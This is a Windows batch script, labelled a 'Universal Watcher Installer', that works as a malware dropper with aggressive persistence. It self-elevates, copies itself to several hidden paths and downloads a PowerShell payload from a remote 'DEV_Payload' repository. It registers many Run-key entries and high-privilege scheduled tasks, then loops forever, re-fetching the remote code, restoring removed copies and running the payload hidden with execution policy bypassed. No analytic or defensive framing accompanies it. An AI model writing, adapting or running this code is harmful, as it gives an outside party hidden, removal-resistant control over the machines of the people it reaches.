@echo off
:: ===============================================
:: UNIVERSAL WATCHER INSTALLER - MAXIMUM PERSISTENCE
:: ===============================================

:: --- ELEVATE SCRIPT ---
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo [INFO] Requesting administrative privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Generate random GUID-like suffixes
setlocal enabledelayedexpansion
set "RAND1=!random!!random!"
set "RAND2=!random!!random!"
set "RAND3=!random!!random!"
endlocal & set "G1=%RAND1%" & set "G2=%RAND2%" & set "G3=%RAND3%"

:: PowerShell script URL
set "SCRIPT_URL=https://raw.githubusercontent.com/Umair13303/DEV_Payload/main/GitHub_Script/PowerShell/Dynamic_Watcher_15E1362D_E98B_4386_9CA9.ps1?nocache=%random%"

:: Batch file install paths
set "BAT1=%APPDATA%\UniversalWatcher_%G1%.bat"
set "BAT2=%ProgramData%\UniversalWatcher_%G2%.bat"
set "BAT3=%TEMP%\UniversalWatcher_%G3%.bat"

:: PowerShell script install paths
set "LOC1=%APPDATA%\UniversalWatcher_%G1%.ps1"
set "LOC2=%ProgramData%\UniversalWatcher_%G2%.ps1"
set "LOC3=%TEMP%\UniversalWatcher_%G3%.ps1"

:: Registry path
set "REG_PATH=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

:: Autorun registry keys
set "BATKEY1=Watcher_BAT_%G1%"
set "BATKEY2=Watcher_BAT_%G2%"
set "BATKEY3=Watcher_BAT_%G3%"
set "PSKEY1=Watcher_PS_%G1%"
set "PSKEY2=Watcher_PS_%G2%"
set "PSKEY3=Watcher_PS_%G3%"

:: Scheduled Task names
set "TASKNAME1=WatcherTask_%G1%"
set "TASKNAME2=WatcherTask_%G2%"
set "TASKNAME3=WatcherTask_%G3%"
set "TASKNAME4=WatcherBoot_%G1%"
set "TASKNAME5=WatcherLogon_%G2%"

:: ========================
:: Copy this batch file to multiple locations
:: ========================
echo [INFO] Saving batch file copies...
copy /y "%~f0" "%BAT1%"
copy /y "%~f0" "%BAT2%"
copy /y "%~f0" "%BAT3%"

:: ========================
:: Download PowerShell scripts
:: ========================
echo [INFO] Downloading PowerShell scripts...
powershell -Command ^
 "$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Bootstrapper'); $s=$wc.DownloadString('%SCRIPT_URL%'); Set-Content -Path '%LOC1%' -Value $s"
powershell -Command ^
 "$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Bootstrapper'); $s=$wc.DownloadString('%SCRIPT_URL%'); Set-Content -Path '%LOC2%' -Value $s"
powershell -Command ^
 "$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Bootstrapper'); $s=$wc.DownloadString('%SCRIPT_URL%'); Set-Content -Path '%LOC3%' -Value $s"

:: ========================
:: Register autorun entries
:: ========================
echo [INFO] Registering autorun entries...
reg add "%REG_PATH%" /v "%BATKEY1%" /d "\"%BAT1%\"" /f
reg add "%REG_PATH%" /v "%BATKEY2%" /d "\"%BAT2%\"" /f
reg add "%REG_PATH%" /v "%BATKEY3%" /d "\"%BAT3%\"" /f
reg add "%REG_PATH%" /v "%PSKEY1%" /d "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%LOC1%\"" /f
reg add "%REG_PATH%" /v "%PSKEY2%" /d "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%LOC2%\"" /f
reg add "%REG_PATH%" /v "%PSKEY3%" /d "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%LOC3%\"" /f

:: ========================
:: Create multiple scheduled tasks for persistence
:: ========================
echo [INFO] Creating scheduled tasks...
schtasks /create /f /sc minute /mo 10 /tn "%TASKNAME1%" /tr "\"%BAT1%\"" /rl HIGHEST
schtasks /create /f /sc minute /mo 10 /tn "%TASKNAME2%" /tr "\"%BAT2%\"" /rl HIGHEST
schtasks /create /f /sc minute /mo 10 /tn "%TASKNAME3%" /tr "\"%BAT3%\"" /rl HIGHEST
schtasks /create /f /sc onstart /tn "%TASKNAME4%" /tr "\"%BAT1%\"" /rl HIGHEST
schtasks /create /f /sc onlogon /tn "%TASKNAME5%" /tr "\"%BAT2%\"" /rl HIGHEST

:: ========================
:: Start the persistence loop
:: ========================
:loop

:: Ensure batch files exist
if not exist "%BAT1%" copy /y "%~f0" "%BAT1%"
if not exist "%BAT2%" copy /y "%~f0" "%BAT2%"
if not exist "%BAT3%" copy /y "%~f0" "%BAT3%"

:: Ensure PowerShell scripts exist AND match remote content
powershell -Command ^
 "$p='%LOC1%'; $wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Bootstrapper'); $s=$wc.DownloadString('%SCRIPT_URL%'); if(!(Test-Path $p) -or (Get-Content $p -Raw) -ne $s){Set-Content -Path $p -Value $s}"

powershell -Command ^
 "$p='%LOC2%'; $wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Bootstrapper'); $s=$wc.DownloadString('%SCRIPT_URL%'); if(!(Test-Path $p) -or (Get-Content $p -Raw) -ne $s){Set-Content -Path $p -Value $s}"

powershell -Command ^
 "$p='%LOC3%'; $wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Bootstrapper'); $s=$wc.DownloadString('%SCRIPT_URL%'); if(!(Test-Path $p) -or (Get-Content $p -Raw) -ne $s){Set-Content -Path $p -Value $s}"

:: Re-register autorun entries if missing
reg query "%REG_PATH%" /v "%BATKEY1%" >nul 2>&1 || reg add "%REG_PATH%" /v "%BATKEY1%" /d "\"%BAT1%\"" /f
reg query "%REG_PATH%" /v "%BATKEY2%" >nul 2>&1 || reg add "%REG_PATH%" /v "%BATKEY2%" /d "\"%BAT2%\"" /f
reg query "%REG_PATH%" /v "%BATKEY3%" >nul 2>&1 || reg add "%REG_PATH%" /v "%BATKEY3%" /d "\"%BAT3%\"" /f
reg query "%REG_PATH%" /v "%PSKEY1%" >nul 2>&1 || reg add "%REG_PATH%" /v "%PSKEY1%" /d "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%LOC1%\"" /f
reg query "%REG_PATH%" /v "%PSKEY2%" >nul 2>&1 || reg add "%REG_PATH%" /v "%PSKEY2%" /d "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%LOC2%\"" /f
reg query "%REG_PATH%" /v "%PSKEY3%" >nul 2>&1 || reg add "%REG_PATH%" /v "%PSKEY3%" /d "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%LOC3%\"" /f

:: Execute PowerShell scripts silently
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%LOC1%"
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%LOC2%"
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%LOC3%"

:: Wait and repeat
timeout /t 10 >nul
goto loop
